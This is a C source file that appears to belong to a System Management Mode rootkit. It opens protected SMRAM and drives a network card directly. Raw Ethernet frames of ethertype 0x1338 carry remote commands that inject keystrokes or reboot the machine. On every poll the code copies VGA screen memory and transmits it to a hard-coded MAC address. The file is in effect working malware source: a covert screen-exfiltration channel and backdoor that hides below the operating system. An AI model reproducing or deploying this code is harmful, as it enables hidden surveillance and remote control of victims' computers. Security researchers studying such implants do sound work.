#include <pci.h>
#include <io.h>
#include <video_defines.h>
#include <smram.h>
#include <pci-bother.h>
#include <output.h>
#include <minilib.h>
#include <lwip/init.h>
#include "net.h"
#include "../aseg/keyboard.h"

static struct nic *_nic = 0x0;

extern struct pci_driver a3c90x_driver;

static char test[1024] = {0};

static char packet[4096] = {0};

typedef struct packet_t {
	char from[6];
	char to[6];
	unsigned short ethertype;
	unsigned short datalen;
	unsigned char command;
	char data[];
} packet_t;

static unsigned char vga_read(unsigned char idx)
{
	outb(CRTC_IDX_REG, idx);
	return inb(CRTC_DATA_REG);
}

static unsigned int vga_base()
{
	return (((unsigned int) vga_read(CRTC_START_ADDR_MSB_IDX)) << 9)
	     + (((unsigned int) vga_read(CRTC_START_ADDR_LSB_IDX)) << 1);
}

void handle_command(packet_t * p)
{
	uint16_t dl = htons(p->datalen);
	int i;

	outputf("NIC: Command: 0x%x, %d bytes", p->command, dl);

	switch (p->command) {
	case 0x42:
		for (i = 0; i < dl; i++)
			kbd_inject_key(p->data[i]);
		break;
	case 0xFE:
		outb(0xCF9, 0x4);       /* Reboot */
		break;
	}
}

void eth_poll()
{
	int i;
//	static int c;
	static short pos = 0x0;
	unsigned short base = vga_base();
	unsigned char *p = (unsigned char *)0xB8000;
	smram_state_t old_state;
	
	if (!_nic)
		return;

	if (_nic->poll(_nic, 0)) {
		_nic->packet = packet;
		_nic->poll(_nic, 1);

		packet_t * p = (packet_t *) packet;

		outputf("NIC: Packet: %d 0x%x", _nic->packetlen, htons(p->ethertype));
		if (htons(p->ethertype) == 0x1338) {
			if (htons(p->datalen) + sizeof(packet_t) > _nic->packetlen) {
				outputf("NIC: Malformed packet");
			} else {
				handle_command(p);
			}
		}
	}
	smram_tseg_set_state(SMRAM_TSEG_OPEN);
	old_state = smram_save_state();
	
//	if ((c++) % 2)
//		return;

	if (((base + 80*25*2)%0x8000) < base)
	{
		if ((pos > ((base + 80*25*2)%0x8000)) && (pos < base))
			pos = base;
	} else if ((pos > base + 80*25*2) || (pos < base))
		pos = base;
	
	test[0] = pos >> 8;
	test[1] = pos & 0xFF;
	test[2] = base >> 8;
	test[3] = base & 0xFF;

	smram_aseg_set_state(SMRAM_ASEG_SMMCODE);
	
	for (i = 4; i < 1024; i++)
	{
		test[i] = p[pos++];
		pos %= 0x8000;
	}
	smram_restore_state(old_state);
	_nic->transmit("\x00\x03\x93\x87\x84\x8C", 0x1337, 1024, test);
}

int eth_register(struct nic *nic)
{
	if (_nic)
		return -1;
	_nic = nic;
	return 0;
}

void eth_init()
{
	/* Required for DMA to work. :( */
	smram_tseg_set_state(SMRAM_TSEG_OPEN);
	pci_probe_driver(a3c90x_driver);
	lwip_init();
}
